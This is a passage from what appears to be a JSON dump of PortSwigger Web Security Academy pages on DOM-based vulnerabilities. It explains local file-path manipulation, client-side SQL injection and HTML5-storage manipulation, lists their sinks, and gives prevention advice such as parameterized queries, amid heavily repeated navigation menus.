file, the attacker may also be able write their own data to the file, which could be the configuration file of the operating system, for example.\n\nIn both of these cases, the actual exploitability of the potential vulnerability may depend on other suitable functionality being present on the website.\n\nWhich sinks can lead to DOM-based local file-path manipulation vulnerabilities?\n-------------------------------------------------------------------------------\n\nThe following are some of the main sinks can lead to DOM-based local file path manipulation vulnerabilities:\n\n```\nFileReader.readAsArrayBuffer()\nFileReader.readAsBinaryString()\nFileReader.readAsDataURL()\nFileReader.readAsText()\nFileReader.readAsFile()\nFileReader.root.getFile()\n```\n\nHow to prevent DOM-based local file-path manipulation vulnerabilities\n---------------------------------------------------------------------\n\nIn addition to the general measures described on the [DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based) page, you should avoid allowing data from any untrusted source to dynamically pass a filename to a file-handling API.\n\n", "category": "DOM Based Vulnerabilities"}, {"title": "Client-side SQL injection", "content": "### DOM-based vulnerabilities\n\n*   [What is the DOM?](https://portswigger.net/web-security/dom-based#what-is-the-dom)\n*    [Taint flow](https://portswigger.net/web-security/dom-based#what-is-taint-flow)\n    *    [Sources](https://portswigger.net/web-security/dom-based#common-sources)\n        *   [Reflected and stored data](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data)\n        *   [Web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)\n    *   [Example sinks](https://portswigger.net/web-security/dom-based#which-sinks-can-lead-to-dom-based-vulnerabilities)\n*   [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)\n*    [Open redirection](https://portswigger.net/web-security/dom-based/open-redirection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/open-redirection#what-is-the-impact-of-dom-based-open-redirection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/open-redirection#which-sinks-can-lead-to-dom-based-open-redirection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/open-redirection#how-to-prevent-dom-based-open-redirection-vulnerabilities)\n*    [Cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/cookie-manipulation#what-is-the-impact-of-a-dom-based-cookie-manipulation-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/cookie-manipulation#which-sinks-can-lead-to-dom-based-cookie-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/cookie-manipulation#how-to-prevent-dom-based-cookie-manipulation-vulnerabilities)\n*    [JavaScript injection](https://portswigger.net/web-security/dom-based/javascript-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/javascript-injection#what-is-the-impact-of-a-dom-based-javascript-injection-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/javascript-injection#which-sinks-can-lead-to-dom-based-javascript-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/javascript-injection#how-to-prevent-dom-based-javascript-injection-vulnerabilities)\n*    [Document-domain manipulation](https://portswigger.net/web-security/dom-based/document-domain-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/document-domain-manipulation#which-sinks-can-lead-to-dom-based-document-domain-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/document-domain-manipulation#how-to-prevent-dom-based-document-domain-manipulation-vulnerabilities)\n*    [WebSocket-URL poisoning](https://portswigger.net/web-security/dom-based/websocket-url-poisoning)\n    *   [Impact](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#what-is-the-impact-of-websocket-url-poisoning)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#which-sinks-can-lead-to-websocket-url-poisoning-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#how-to-prevent-dom-based-websocket-url-poisoning-vulnerabilities)\n*    [Link manipulation](https://portswigger.net/web-security/dom-based/link-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/link-manipulation#what-is-the-impact-of-a-dom-based-link-manipulation-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/link-manipulation#which-sinks-can-lead-to-dom-based-link-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/link-manipulation#how-to-prevent-dom-based-link-manipulation-vulnerabilities)\n*    [Web message manipulation](https://portswigger.net/web-security/dom-based/web-message-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/web-message-manipulation#which-sinks-can-lead-to-dom-based-web-message-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/web-message-manipulation#how-to-prevent-dom-based-web-message-manipulation)\n*    [Ajax request-header manipulation](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#what-is-the-impact-of-dom-based-ajax-request-header-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#which-sinks-can-lead-to-dom-based-ajax-request-header-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#how-to-prevent-dom-based-ajax-request-header-manipulation)\n*    [Local file-path manipulation](https://portswigger.net/web-security/dom-based/local-file-path-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#what-is-the-impact-of-dom-based-local-file-path-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#which-sinks-can-lead-to-dom-based-local-file-path-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#how-to-prevent-dom-based-local-file-path-manipulation-vulnerabilities)\n*    [Client-side SQL injection](https://portswigger.net/web-security/dom-based/client-side-sql-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-sql-injection#what-is-the-impact-of-dom-based-client-side-sql-injection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-sql-injection#which-sinks-can-lead-to-dom-based-client-side-sql-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-sql-injection#how-to-prevent-dom-based-client-side-sql-injection-vulnerabilities)\n*    [HTML5-storage manipulation](https://portswigger.net/web-security/dom-based/html5-storage-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/html5-storage-manipulation#which-sinks-can-lead-to-dom-based-html5-storage-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/html5-storage-manipulation#how-to-prevent-dom-based-html5-storage-manipulation-vulnerabilities)\n*    [Client-side XPath injection](https://portswigger.net/web-security/dom-based/client-side-xpath-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#what-is-the-impact-of-dom-based-xpath-injection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#which-sinks-can-lead-to-xpath-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#how-to-prevent-dom-based-xpath-injection-vulnerabilities)\n*    [Client-side JSON injection](https://portswigger.net/web-security/dom-based/client-side-json-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-json-injection#what-is-the-impact-of-a-dom-based-json-injection-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-json-injection#which-sinks-can-lead-to-dom-based-json-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-json-injection#how-to-prevent-client-side-json-injection-vulnerabilities)\n*    [DOM-data manipulation](https://portswigger.net/web-security/dom-based/dom-data-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/dom-data-manipulation#what-is-the-impact-of-dom-data-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/dom-data-manipulation#which-sinks-can-lead-to-dom-data-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/dom-data-manipulation#how-to-prevent-dom-data-manipulation-vulnerabilities)\n*    [Denial of service](https://portswigger.net/web-security/dom-based/denial-of-service)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/denial-of-service#which-sinks-can-lead-to-dom-based-denial-of-service-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/denial-of-service#how-to-prevent-dom-based-denial-of-service-vulnerabilities)\n*    [Web message vulnerabilities](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)\n    *   [Impact](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#what-is-the-impact-of-dom-based-web-message-vulnerabilities)\n    *   [Constructing an attack](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#how-to-construct-an-attack-using-web-messages-as-the-source)\n    *   [Origin verification](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#origin-verification)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#which-sinks-can-lead-to-dom-based-web-message-vulnerabilities)\n*    [DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)\n    *   [Exploiting](https://portswigger.net/web-security/dom-based/dom-clobbering#how-to-exploit-dom-clobbering-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/dom-clobbering#how-to-prevent-dom-clobbering-attacks)\n*   [Preventing vulnerabilities](https://portswigger.net/web-security/dom-based#how-to-prevent-dom-based-taint-flow-vulnerabilities)\n*   [View all DOM-based vulnerability labs](https://portswigger.net/web-security/all-labs#dom-based-vulnerabilities)\n\n*   [Web Security Academy](https://portswigger.net/web-security)\n*   [DOM-based](https://portswigger.net/web-security/dom-based)\n*   [Client-side SQL injection](https://portswigger.net/web-security/dom-based/client-side-sql-injection)\n\nDOM-based client-side SQL injection\n===================================\n\nIn this section, we'll discuss what DOM-based client-side [SQL injection](https://portswigger.net/web-security/sql-injection) is, describe how an attacker can exploit this vulnerability, and suggest ways to reduce your exposure to this kind of attack.\n\nWhat is DOM-based client-side SQL injection?\n--------------------------------------------\n\nClient-side SQL-injection vulnerabilities arise when a script incorporates attacker-controllable data into a client-side SQL query in an unsafe way. An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will execute an arbitrary SQL query within the local SQL database of the user's browser.\n\nWhat is the impact of DOM-based client-side SQL injection?\n----------------------------------------------------------\n\nThe potential impact of the vulnerability depends on the website's usage of the SQL database. If the database is used to store sensitive data, such as messages on a social network, the attacker may be able to retrieve this data.\n\nIf the database is used to store pending user actions, such as outgoing messages in an email application, then the attacker may be able to modify this data and perform arbitrary actions on the user's behalf.\n\nWhich sinks can lead to DOM-based client-side SQL-injection vulnerabilities?\n----------------------------------------------------------------------------\n\nThe JavaScript database function `executeSql()` can lead to client-side SQL-injection vulnerabilities.\n\nHow to prevent DOM-based client-side SQL-injection vulnerabilities\n------------------------------------------------------------------\n\nIn addition to the general measures described on the [DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based) page, you should make sure that you use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to safely incorporate potentially tainted data into SQL queries:\n\n*   The application specifies the structure of the query, leaving placeholders for each item of user input.\n*   The application specifies the contents of each placeholder. As the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure.\n\nIn the JavaScript `executeSql()` API, parameterized items can be designated within the query string using the query character `?`. For each parameterized item, an additional parameter is passed to the API containing the item's value. To prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application, it is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted.\n\n", "category": "DOM Based Vulnerabilities"}, {"title": "HTML5-storage manipulation", "content": "### DOM-based vulnerabilities\n\n*   [What is the DOM?](https://portswigger.net/web-security/dom-based#what-is-the-dom)\n*    [Taint flow](https://portswigger.net/web-security/dom-based#what-is-taint-flow)\n    *    [Sources](https://portswigger.net/web-security/dom-based#common-sources)\n        *   [Reflected and stored data](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data)\n        *   [Web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)\n    *   [Example sinks](https://portswigger.net/web-security/dom-based#which-sinks-can-lead-to-dom-based-vulnerabilities)\n*   [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)\n*    [Open redirection](https://portswigger.net/web-security/dom-based/open-redirection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/open-redirection#what-is-the-impact-of-dom-based-open-redirection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/open-redirection#which-sinks-can-lead-to-dom-based-open-redirection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/open-redirection#how-to-prevent-dom-based-open-redirection-vulnerabilities)\n*    [Cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/cookie-manipulation#what-is-the-impact-of-a-dom-based-cookie-manipulation-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/cookie-manipulation#which-sinks-can-lead-to-dom-based-cookie-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/cookie-manipulation#how-to-prevent-dom-based-cookie-manipulation-vulnerabilities)\n*    [JavaScript injection](https://portswigger.net/web-security/dom-based/javascript-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/javascript-injection#what-is-the-impact-of-a-dom-based-javascript-injection-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/javascript-injection#which-sinks-can-lead-to-dom-based-javascript-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/javascript-injection#how-to-prevent-dom-based-javascript-injection-vulnerabilities)\n*    [Document-domain manipulation](https://portswigger.net/web-security/dom-based/document-domain-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/document-domain-manipulation#which-sinks-can-lead-to-dom-based-document-domain-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/document-domain-manipulation#how-to-prevent-dom-based-document-domain-manipulation-vulnerabilities)\n*    [WebSocket-URL poisoning](https://portswigger.net/web-security/dom-based/websocket-url-poisoning)\n    *   [Impact](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#what-is-the-impact-of-websocket-url-poisoning)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#which-sinks-can-lead-to-websocket-url-poisoning-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#how-to-prevent-dom-based-websocket-url-poisoning-vulnerabilities)\n*    [Link manipulation](https://portswigger.net/web-security/dom-based/link-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/link-manipulation#what-is-the-impact-of-a-dom-based-link-manipulation-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/link-manipulation#which-sinks-can-lead-to-dom-based-link-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/link-manipulation#how-to-prevent-dom-based-link-manipulation-vulnerabilities)\n*    [Web message manipulation](https://portswigger.net/web-security/dom-based/web-message-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/web-message-manipulation#which-sinks-can-lead-to-dom-based-web-message-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/web-message-manipulation#how-to-prevent-dom-based-web-message-manipulation)\n*    [Ajax request-header manipulation](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#what-is-the-impact-of-dom-based-ajax-request-header-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#which-sinks-can-lead-to-dom-based-ajax-request-header-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#how-to-prevent-dom-based-ajax-request-header-manipulation)\n*    [Local file-path manipulation](https://portswigger.net/web-security/dom-based/local-file-path-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#what-is-the-impact-of-dom-based-local-file-path-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#which-sinks-can-lead-to-dom-based-local-file-path-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#how-to-prevent-dom-based-local-file-path-manipulation-vulnerabilities)\n*    [Client-side SQL injection](https://portswigger.net/web-security/dom-based/client-side-sql-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-sql-injection#what-is-the-impact-of-dom-based-client-side-sql-injection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-sql-injection#which-sinks-can-lead-to-dom-based-client-side-sql-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-sql-injection#how-to-prevent-dom-based-client-side-sql-injection-vulnerabilities)\n*    [HTML5-storage manipulation](https://portswigger.net/web-security/dom-based/html5-storage-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/html5-storage-manipulation#which-sinks-can-lead-to-dom-based-html5-storage-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/html5-storage-manipulation#how-to-prevent-dom-based-html5-storage-manipulation-vulnerabilities)\n*    [Client-side XPath injection](https://portswigger.net/web-security/dom-based/client-side-xpath-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#what-is-the-impact-of-dom-based-xpath-injection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#which-sinks-can-lead-to-xpath-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#how-to-prevent-dom-based-xpath-injection-vulnerabilities)\n*    [Client-side JSON injection](https://portswigger.net/web-security/dom-based/client-side-json-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-json-injection#what-is-the-impact-of-a-dom-based-json-injection-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-json-injection#which-sinks-can-lead-to-dom-based-json-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-json-injection#how-to-prevent-client-side-json-injection-vulnerabilities)\n*    [DOM-data manipulation](https://portswigger.net/web-security/dom-based/dom-data-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/dom-data-manipulation#what-is-the-impact-of-dom-data-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/dom-data-manipulation#which-sinks-can-lead-to-dom-data-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/dom-data-manipulation#how-to-prevent-dom-data-manipulation-vulnerabilities)\n*    [Denial of service](https://portswigger.net/web-security/dom-based/denial-of-service)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/denial-of-service#which-sinks-can-lead-to-dom-based-denial-of-service-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/denial-of-service#how-to-prevent-dom-based-denial-of-service-vulnerabilities)\n*    [Web message vulnerabilities](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)\n    *   [Impact](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#what-is-the-impact-of-dom-based-web-message-vulnerabilities)\n    *   [Constructing an attack](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#how-to-construct-an-attack-using-web-messages-as-the-source)\n    *   [Origin verification](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#origin-verification)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#which-sinks-can-lead-to-dom-based-web-message-vulnerabilities)\n*    [DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)\n    *   [Exploiting](https://portswigger.net/web-security/dom-based/dom-clobbering#how-to-exploit-dom-clobbering-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/dom-clobbering#how-to-prevent-dom-clobbering-attacks)\n*   [Preventing vulnerabilities](https://portswigger.net/web-security/dom-based#how-to-prevent-dom-based-taint-flow-vulnerabilities)\n*   [View all DOM-based vulnerability labs](https://portswigger.net/web-security/all-labs#dom-based-vulnerabilities)\n\n*   [Web Security Academy](https://portswigger.net/web-security)\n*   [DOM-based](https://portswigger.net/web-security/dom-based)\n*   [HTML5-storage manipulation](https://portswigger.net/web-security/dom-based/html5-storage-manipulation)\n\nDOM-based HTML5-storage manipulation\n====================================\n\nIn this section, we'll look at HTML5-storage manipulation using the DOM, point out potentially dangerous sinks that can be used as part of this kind of attack, and suggest ways to reduce your exposure to HTML5-storage manipulation.\n\nWhat is DOM-based HTML5-storage manipulation?\n---------------------------------------------\n\nHTML5-storage manipulation vulnerabilities arise when a script stores attacker-controllable data in the HTML5 storage of the web browser (either `localStorage` or `sessionStorage`). An attacker may be able to use this behavior to construct a URL that, if visited by another user, will cause the user's browser to store attacker-controllable data.\n\nThis behavior does not in itself constitute a security vulnerability. However, if the application later reads data back from storage and processes it in an unsafe way, an attacker may be able to leverage the storage mechanism to deliver other DOM-based attacks, such as [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) and JavaScript injection.\n\nWhich sinks can lead to DOM-based HTML5-storage manipulation vulnerabilities?\n-----------------------------------------------------------------------------\n\nThe following are some of the main sinks that can lead to DOM-based HTML5-storage manipulation vulnerabilities:\n\n```\nsessionStorage.setItem()\nlocalStorage.setItem()\n```\n\nHow to prevent DOM-based HTML5-storage manipulation vulnerabilities\n-------------------------------------------------------------------\n\nIn addition to the general measures described on the [DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based) page, you should avoid allowing data from any untrusted source to be placed in HTML5 storage.\n\n", "category": "DOM Based Vulnerabilities"}, {"title": "Client-side XPath injection", "content": "### DOM-based vulnerabilities\n\n*   [What is the DOM?](https://portswigger.net/web-security/dom-based#what-is-the-dom)\n*    [Taint flow](https://portswigger.net/web-security/dom-based#what-is-taint-flow)\n    *    [Sources](https://portswigger.net/web-security/dom-based#common-sources)\n        *   [Reflected and stored data](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data)\n        *   [Web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)\n    *   [Example sinks](https://portswigger.net/web-security/dom-based#which-sinks-can-lead-to-dom-based-vulnerabilities)\n*   [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)\n*    [Open redirection](https://portswigger.net/web-security/dom-based/open-redirection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/open-redirection#what-is-the-impact-of-dom-based-open-redirection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/open-redirection#which-sinks-can-lead-to-dom-based-open-redirection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/open-redirection#how-to-prevent-dom-based-open-redirection-vulnerabilities)\n*    [Cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/cookie-manipulation#what-is-the-impact-of-a-dom-based-cookie-manipulation-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/cookie-manipulation#which-sinks-can-lead-to-dom-based-cookie-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/cookie-manipulation#how-to-prevent-dom-based-cookie-manipulation-vulnerabilities)\n*    [JavaScript injection](https://portswigger.net/web-security/dom-based/javascript-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/javascript-injection#what-is-the-impact-of-a-dom-based-javascript-injection-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/javascript-injection#which-sinks-can-lead-to-dom-based-javascript-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/javascript-injection#how-to-prevent-dom-based-javascript-injection-vulnerabilities)\n*    [Document-domain manipulation](https://portswigger.net/web-security/dom-based/document-domain-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/document-domain-manipulation#which-sinks-can-lead-to-dom-based-document-domain-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/document-domain-manipulation#how-to-prevent-dom-based-document-domain-manipulation-vulnerabilities)\n*    [WebSocket-URL poisoning](https://portswigger.net/web-security/dom-based/websocket-url-poisoning)\n    *   [Impact](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#what-is-the-impact-of-websocket-url-poisoning)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#which-sinks-can-lead-to-websocket-url-poisoning-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#how-to-prevent-dom-based-websocket-url-poisoning-vulnerabilities)\n*    [Link manipulation](https://portswigger.net/web-security/dom-based/link-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/link-manipulation#what-is-the-impact-of-a-dom-based-link-manipulation-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/link-manipulation#which-sinks-can-lead-to-dom-based-link-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/link-manipulation#how-to-prevent-dom-based-link-manipulation-vulnerabilities)\n*    [Web message manipulation](https://portswigger.net/web-security/dom-based/web-message-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/web-message-manipulation#which-sinks-can-lead-to-dom-based-web-message-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/web-message-manipulation#how-to-prevent-dom-based-web-message-manipulation)\n*    [Ajax request-header manipulation](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#what-is-the-impact-of-dom-based-ajax-request-header-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#which-sinks-can-lead-to-dom-based-ajax-request-header-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#how-to-prevent-dom-based-ajax-request-header-manipulation)\n*    [Local file-path manipulation](https://portswigger.net/web-security/dom-based/local-file-path-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#what-is-the-impact-of-dom-based-local-file-path-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#which-sinks-can-lead-to-dom-based-local-file-path-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#how-to-prevent-dom-based-local-file-path-manipulation-vulnerabilities)\n*    [Client-side SQL injection](https://portswigger.net/web-security/dom-based/client-side-sql-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-sql-injection#what-is-the-impact-of-dom-based-client-side-sql-injection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-sql-injection#which-sinks-can-lead-to-dom-based-client-side-sql-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-sql-injection#how-to-prevent-dom-based-client-side-sql-injection-vulnerabilities)\n*    [HTML5-storage manipulation](https://portswigger.net/web-security/dom-based/html5-storage-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/html5-storage-manipulation#which-sinks-can-lead-to-dom-based-html5-storage-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/html5-storage-manipulation#how-to-prevent-dom-based-html5-storage-manipulation-vulnerabilities)\n*    [Client-side XPath injection](https://portswigger.net/web-security/dom-based/client-side-xpath-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#what-is-the-impact-of-dom-based-xpath-injection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#which-sinks-can-lead-to-xpath-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#how-to-prevent-dom-based-xpath-injection-vulnerabilities)\n*    [Client-side JSON injection](https://portswigger.net/web-security/dom-based/client-side-json-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-json-injection#what-is-the-impact-of-a-dom-based-json-injection-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-json-injection#which-sinks-can-lead-to-dom-based-json-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-json-injection#how-to-prevent-client-side-json-injection-vulnerabilities)\n*    [DOM-data manipulation](https://portswigger.net/web-security/dom-based/dom-data-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/dom-data-manipulation#what-is-the-impact-of-dom-data-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/dom-data-manipulation#which-sinks-can-lead-to-dom-data-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/dom-data-manipulation#how-to-prevent-dom-data-manipulation-vulnerabilities)\n*    [Denial of service](https://portswigger.net/web-security/dom-based/denial-of-service)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/denial-of-service#which-sinks-can-lead-to-dom-based-denial-of-service-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/denial-of-service#how-to-prevent-dom-based-denial-of-service-vulnerabilities)\n*    [Web message vulnerabilities](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)\n    *   [Impact](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#what-is-the-impact-of-dom-based-web-message-vulnerabilities)\n    *   [Constructing an attack](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#how-to-construct-an-attack-using-web-messages-as-the-source)\n    *   [Origin verification](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#origin-verification)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#which-sinks-can-lead-to-dom-based-web-message-vulnerabilities)\n*    [DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)\n    *   